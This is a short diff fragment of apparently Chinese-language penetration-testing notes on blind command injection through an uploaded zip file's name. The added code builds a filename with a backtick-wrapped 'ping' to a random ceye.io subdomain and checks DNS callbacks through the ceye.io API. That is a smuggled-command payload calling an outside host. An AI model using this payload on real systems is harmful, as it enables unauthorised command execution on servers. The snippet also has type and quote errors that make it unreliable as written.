@@ -269,10 +269,15 @@ Content-Type: application/zip
 
 PIng写法:
 空格："ping "
+
 random random = new Random();
+
 int randomNumber = random.Next(1, 100);
+
 string filePath = “xxx.ceye.io”;
+
 String filepath1 = randomNumber + “.” + filePath;
+
  String filepath2 = "`" +"ping "+ filepath1 + "`"+".zip";
 
   验证的话， 还是采用http://api.ceye.io/v1/records?token=去验证
